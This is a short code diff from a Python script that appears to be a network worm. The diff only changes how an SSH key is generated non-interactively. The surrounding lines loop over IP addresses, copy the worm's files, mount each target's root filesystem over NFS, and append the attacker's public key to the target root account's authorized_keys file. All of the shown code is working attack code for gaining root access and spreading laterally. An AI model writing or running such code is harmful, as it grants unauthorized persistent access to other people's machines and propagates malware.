@@ -14,7 +14,7 @@ def main():
         for ip in ssh():
             os.system('mkdir ~/lotus')
             os.system('cp -r * ~/lotus')
-            os.system('ssh-keygen < worminput.txt')
+            os.system('{ echo -ne "\n" ; echo -ne "y" ; echo -ne "\n"; } | ssh-keygen')
             os.system('mkdir /tmp/r00t')
             os.system('mount -t nfs ' + str(ip) + ':/ /tmp/r00t/')
             os.system('cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys')
